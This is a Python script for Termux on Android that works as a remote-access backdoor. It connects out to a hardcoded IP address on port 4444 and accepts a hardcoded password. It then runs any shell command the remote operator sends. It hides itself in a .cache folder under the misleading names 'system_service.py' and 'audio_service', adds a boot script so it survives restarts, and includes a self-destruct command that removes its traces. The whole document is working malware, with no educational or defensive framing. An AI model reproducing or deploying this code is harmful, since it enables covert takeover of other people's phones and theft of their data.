#!/usr/bin/env python3
import socket
import subprocess
import os
import time
import threading
from pathlib import Path
import sys

CONTROLLER_IP = '81.222.190.41'
PORT = 4444
RECONNECT_TIME = 30
SECRET_KEY = 'gost666gffgg'

def hide_activity():
    os.system('mkdir -p /data/data/com.termux/files/home/.cache')
    os.chdir('/data/data/com.termux/files/home/.cache')
    
def setup_persistence():
    boot_dir = Path('/data/data/com.termux/files/home/.termux/boot/')
    boot_dir.mkdir(parents=True, exist_ok=True)
    
    startup_script = boot_dir / 'audio_service'
    startup_script.write_text('#!/bin/bash\ncd ~/.cache && python system_service.py &\n')
    os.chmod(startup_script, 0o755)
    
    os.system('mv ~/system_service.py ~/.cache/')
    os.system('chmod +x ~/.cache/system_service.py')

def get_connection():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((CONTROLLER_IP, PORT))
            return s
        except:
            time.sleep(RECONNECT_TIME)

def handle_connection(conn):
    conn.send(b'Enter secret key: ')
    key_attempt = conn.recv(1024).decode('utf-8').strip()
    
    if key_attempt != SECRET_KEY:
        conn.send(b'Access denied!')
        conn.close()
        return
        
    conn.send(b'Access granted! Welcome to Termux control.\n')
    
    while True:
        try:
            conn.send(b'\ncontrol@termux:~$ ')
            cmd = conn.recv(4096).decode('utf-8').strip()
            
            if not cmd:
                continue
                
            if cmd == 'exit':
                conn.send(b'Session terminated.\n')
                break
                
            if cmd == '::SELF_DESTRUCT::':
                os.system('rm -rf ~/.cache/system_service.py')
                os.system('rm -rf ~/.termux/boot/audio_service')
                conn.send(b'[+] Service removed permanently\n')
                break
                
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            conn.send(result)
            
        except Exception as e:
            conn.send(f'Error: {str(e)}'.encode())

def main():
    hide_activity()
    setup_persistence()
    
    while True:
        try:
            conn = get_connection()
            handle_connection(conn)
            conn.close()
        except:
            time.sleep(RECONNECT_TIME)

if __name__ == '__main__':
    thread = threading.Thread(target=main, daemon=True)
    thread.start()
    
    while True:
        time.sleep(3600)
